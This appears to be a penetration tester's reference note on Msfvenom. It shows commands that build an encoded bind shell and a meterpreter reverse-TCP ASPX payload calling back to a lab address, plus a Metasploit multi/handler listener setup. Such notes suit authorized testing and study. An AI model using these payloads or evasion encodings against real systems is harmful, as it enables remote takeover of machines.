---
id: Msfvenom
aliases: []
tags:
  - Pentest/Tools/Metasploit/Msfvenom
---

# Msfvenom

[MSFVenom](https://www.offsec.com/metasploit-unleashed/msfvenom/)
replaces [MSFPayload](https://www.offsec.com/metasploit-unleashed/msfpayload/)
and [MSFEncode](https://www.offsec.com/metasploit-unleashed/msfencode/)

<!-- Warning {{{-->
> [!warning]- Deprecated
>
> - **MSFPayload**: Used to generate shellcode for a specific processor architecture
>   and OS release
> - **MSFEncode**: Used to removing bad characters (*hexadecimal opcodes*)
>   from shellcode and AV evasion
<!-- }}} -->

```sh
msfvenom -h
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
> ```
> ```sh
> Found 1 compatible encoders
> ```
<!-- }}} -->

Generate Payload

```sh
msfvenom -p <payload> -f <format> <options>
```

<!-- Example {{{-->
> [!example]-
>
> 1. Generate payload (*TCP reverse shell*)
>
> ```sh
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
> ```
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> [-] No arch selected, selecting arch: x86 from the payload
> No encoder or badchars specified, outputting raw payload
> Payload size: 341 bytes
> Final size of aspx file: 2819 bytes
> ```
>
> 2. Set up [Generic Payload Handler](https://www.rapid7.com/db/modules/exploit/multi/handler/)
>
> ```sh
> msfconsole -q
> ```
> ```sh
> use multi/handler
> ```
> ```sh
> set LHOST tun0
> ```
> ```sh
> set LPORT 1337
> ```
> ```sh
> exploit
> ```
>
<!-- }}} -->
